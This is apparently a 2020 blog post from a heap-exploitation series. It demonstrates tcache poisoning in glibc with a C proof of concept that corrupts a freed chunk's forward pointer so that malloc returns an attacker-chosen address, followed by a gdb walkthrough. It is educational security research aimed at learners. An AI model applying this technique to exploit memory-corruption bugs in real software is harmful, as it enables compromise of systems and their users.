---
layout: post
title: "Heap Funk: Playing with TCache"
date: 2020-07-10 08:59:00 +0200
tags: [Heap, C, Linux]
author: MrI/O
categories: research
excerpt_separator: <!--more-->

---


As I was learning some stuff about TCache, and its lack of checks, it came patent that some of those already mitigated attacks were available once again. I was especially concerned about how the TCache bin was managed, and thus decided to go a little deeper. There's many checks being overlooked due to performance reasons. 

What would happen if we issue a `free` over a pointer obtained via `malloc` and then modify something inside it, will it be actually disrupting the heap management? >) 

Let's find out
<!--more-->

As explained on [previous posts]({% post_url 2020-06-03-HeapSeries-4-5-Basics %}), the freebins are used to keep track of the previously allocated chunks of memory. The chunk structure is constructed adding a couple fields before the **actual** data we can play with, and by reusing some of the bytes we requested, to fill them with pointers to the next/previous items in the list, as well as their sizes.

So far so good. 



### TCache Poisoning


##### [`tcache_poisoning.c`](/assets/heapseries/tcache/tcache_poisoning.c)
{% highlight c linenos %}

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stddef.h>

struct forged_chunk {
    size_t prev_size;
    size_t size;
    struct forged_chunk *fd;
    struct forged_chunk *bk;
        /* Only used for large blocks: pointer to next larger size.  */
    struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
    struct malloc_chunk* bk_nextsize;
};


struct forged_chunk *freed_to_chunk(void *p) {
    return p - offsetof(struct forged_chunk, fd);
}

int main() {
    void *a = malloc(10);
    char victim_data[] = "DeadCafeF0";
    printf("[i] Allocated a\n\t|...a@%p\n", a);

    struct forged_chunk f_chunk;
    printf("[i] Allocated a forged_chunk\n");
       printf("\t|...f_chunk@%p\n", &f_chunk);


    f_chunk.size = 0x20; // 0x20 if 64b, 0x10 if 32b
    printf("[i] Attackers data\n");
       printf("\t|...&f_chunk.fd@%p\n", &f_chunk.fd);

    f_chunk.fd = victim_data;

    printf("[i] Allocated stuff in forged_chunk\n");
            printf("\t|...%s\n", (char*)f_chunk.fd);
    free(a);
            printf("\t|...a@%p got freed-up\n\n", a);

    struct forged_chunk *c_a = freed_to_chunk(a);
    printf("[*] TCACHE BIN CURRENT STATE\n");
        printf("\t|...head[fd] -> a[fd] -> %p -> tail\n", c_a->fd);//a);
        printf("\t\t|...Messing up fastbin-chunk\n");
        printf("\t\t|...Swapping a->fd to f_chunk->fd@%p\n\n", &f_chunk.fd);

    c_a->fd = (char*)&f_chunk.fd;

    printf("[*] TCACHE BIN MESSED UP STATE\n");
        printf("\t|...head[fd] -> a[fd] -> %p -> tail\n\n", c_a->fd);

    printf("[i] Allocating 10 bytes to get rid of a\n");
    void * c = malloc(10);
        printf("\t|...allocated _@%p\n\n", c);

    char *victim = (char*) malloc(10);
    printf("[*] Requesting another 10 bytes\n");
        printf("\t|...victim@%p\n\t\t|...== f_chunk->fd@%p\n\n", victim, &f_chunk.fd);

    printf("[*] Printing out *victim allocated memory:\n");
        printf("\t|...%s\n", *(char**)victim);

    free(c);
    return 0;
}
{% endhighlight %}


>This is a rather lengthly code, however most of it is just `printf` and the code is pretty self-explanatory.

As stated before, our idea here is to disrupt the TCache linked-list structure in order to _confuse_ the heap manager to make it return an arbitrary pointer on our next allocation. 

To recap some of the stuff learned before:

- If we `malloc` some bytes (up to 1032B on a 64bit arch and 516 on a 32bit arch counting with the overheading) we get a pointer that will likely end up in a TCache bin once freed.
- If we `free` that pointer, and there's less than 7 chunks already in the TCache bin for that size, the chunk will be referenced at the TCache bin structure as the next chunk to be returned for a new allocation of that size.
- If we `malloc` again the same amount of bytes, then we get the very same chunk we got before. 

If, for some reason, we would be able to modify the `fd` pointer of a freed chunk in the TCache bin, the next-next `malloc` request will return the modified pointer. The first next is the actual and real chunk. The second one, is our forged chunk at some random address.

Let's take a look at this particular behavior by debugging the provided example. 

> You can compile the code with
>
> `gcc tcache_poisoning.c -Wall -ggdb -o tcache_poisoning` 


#### Debugging the TCache poisoning

Giving that there's a ton of `printf` coded to aid in how the heap looks like, we're going to use `gdbserver` to run in a separate shell so we can see the program's output. 

Let's run it: `gdbserver :9999 ./tcache_poisoning` and in another shell: `gdb ./tcache_poisoning -q`

![Fire-up gdbserver and gdb](/assets/heapseries/tcache/gdb1.png)


Still, we need to connect both sessions, so run `target remote 127.0.0.1:9999` at the `gdb` shell.

![Connect to remote target](/assets/heapseries/tcache/gdb2.png)

It will spit a lot of info and will break at the entry point.

![Connect to remote target](/assets/heapseries/tcache/gdb3.png)

Place a breakpoint at main `b main` and let it continue `c`: 

![Break at main](/assets/heapseries/tcache/gdb4.png)


I'm going to let it run until line 48 of our code, `n 18`, and then we'll take a look at the heap status :)

![TCache bin status](/assets/heapseries/tcache/gdb5.png)

Well, apparently the TCache has our just freed chunk right there. By inspecting the heap with some of those handful tools we installed in the [third part of the HeapSeries]({% post_url 2020-06-03-HeapSeries-3-5-Basics %}), we can see if this is actually true: 


![TCache bin status](/assets/heapseries/tcache/gdb6.png)

Nice. It seems the `FD` of our chunk points to 0x0, thus the `(nil)` thing printed above. That's the pointer we want to modify. 

Hit `n`ext a couple times more until we get line 48 executed and some more info printed out for us: 


![TCache bin to be messed up](/assets/heapseries/tcache/gdb7.png)


Good, so we definitely messed with the TCache bin linked list. 

![TCache bin status](/assets/heapseries/tcache/gdb8.png)

Worse than we thought: 

![TCache bin so weird...](/assets/heapseries/tcache/gdb9.png)


As we can see, the TCache bin looks pretty foo-up right now... 

- The first chunk to be returned on the next `malloc` request will be `0x555555559260`
- The next one will be our forged chunk @`0x7fffffffe210`. Which, at the same time points to another address (`0x7fffffffe235`), which finally points to our string. That's the reason for the double dereference at line 62 of our code. (More on this later)

If we let it run for a little bit more, we can see how, by requesting `malloc` twice, our _victim_ makes its appearance and it points to the same address as our forged chunk.

![Victim address!](/assets/heapseries/tcache/gdb10.png)

Finally, let it continue to the end so we'll see how it prints the victim buffer from our forged chunk address: 


![Buffer print!](/assets/heapseries/tcache/gdb11.png)


---

#### Conclusions

TCache was a great performance improvement introduced into GLIBC implementation, however, it comes at a cost.

Some of the mitigations put in place are rendered useless when it comes to using TCache. So, everytime you're exploiting some random heap-realted vulnerability, keep on mind that the implementation


###### Hint hint!

If you're wondering why we didn't just `strcpy` the string buffer into the `c_a.fd` so it could be accessed directly instead of using a double dereference, I'd like to point you to [GLIBC2.28 implementation](https://sources.debian.org/src/glibc/2.28-10/malloc/malloc.c/#L2936) (yikes...) where you will find that at some point in the memory allocation, the `bk` is set to `NULL` thus string terminating our buffer, as you can see in the following img.

But hey, don't trust me: Here, try it yourself with a [modified code ;)](/assets/heapseries/tcache/tcache_poisoning2.c)

![Malloc.c internals](/assets/heapseries/tcache/gdb12.png)


### References

A lot of them, to be honest :D Check out the [references]({% post_url 2020-06-03-HeapSeries-References %}) for the HeapSeries and some more here: 

- [GLIBC 2.28 implementation](https://sources.debian.org/src/glibc/2.28-10/malloc/malloc.c)
- [Heap Structure at the CTF Wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_structure/)
- [children_tcache writeup and tcache overview](http://eternal.red/2018/children_tcache-writeup-and-tcache-overview/)






